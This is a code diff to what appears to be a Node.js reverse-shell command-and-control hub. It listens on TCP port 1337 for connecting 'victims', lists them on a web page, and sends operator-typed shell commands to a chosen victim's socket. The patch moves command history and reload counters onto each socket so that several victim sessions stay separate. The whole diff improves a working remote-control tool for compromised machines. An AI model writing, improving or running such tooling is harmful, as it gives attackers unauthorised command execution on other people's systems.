@@ -15,17 +15,18 @@ nunjucks.configure('views', {
 
 var tcpPort = 1337;
 var victims = [];
-var commandLine = '';
-var previousCommandLine = '';
-var timesReloadedSuccesfully = 0;
 
 // Function passed as parameter is executed for every new connection
 net.createServer(function(sock) {
     console.log('%s Victim %s connected', date.format(), sock.remoteAddress );
 
+    sock.commandLine = '';
+    sock.previousCommandLine = '';
+    sock.timesReloadedSuccesfully = 0;
+
     // Event listener for receiving data
     sock.on('data', function(data){
-        commandLine += data;
+        this.commandLine += data;
         console.log('%s Victim %s responded:\n%s', date.format(), sock.remoteAddress, data);
     })
     // Event listeners for end of connection
@@ -77,7 +78,6 @@ app.get('/', function (req, res) {
         res.render('index.html');
     }
     else{
-        commandLine = '';
         res.render('hub.html', { victims });
     }
 })
@@ -95,17 +95,17 @@ app.get('/:ip', checkVictim, function (req, res) {
         // been changed 5 times, stop reloading the page (end = true)
         // This is done to get the largest number of responses when shell splits one response in many ones 
         // (ie. PowerShell)
-        if (previousCommandLine == commandLine){
-            timesReloadedSuccesfully++;
+        if (victim.previousCommandLine == victim.commandLine){
+            victim.timesReloadedSuccesfully++;
         }
         else{
-            timesReloadedSuccesfully = 0;
-            previousCommandLine = commandLine;
+            victim.timesReloadedSuccesfully = 0;
+            victim.previousCommandLine = victim.commandLine;
         }
-        if (timesReloadedSuccesfully > 5){
+        if (victim.timesReloadedSuccesfully > 5){
             end = true;
         }
-        res.render('victim.html', { victim, commandLine, end});
+        res.render('victim.html', { victim, end});
     }
 })
 
@@ -117,13 +117,12 @@ app.post('/:ip', checkVictim, async function (req, res) {
         res.redirect(303, '/');
     }
     else{
-        timesReloadedSuccesfully = 0;
-        previousCommandLine = '';
-        commandLine += ' > ' + req.body.command + '\n';
+        victim.timesReloadedSuccesfully = 0;
+        victim.commandLine += ' > ' + req.body.command + '\n';
         victim.write(req.body.command + '\n');
         console.log("%s User sent command: %s", date.format(), req.body.command);
         await waitForResponse(victim);
-        res.render('victim.html', { victim, commandLine, end: false});
+        res.render('victim.html', { victim, end: false});
     }
 })
 
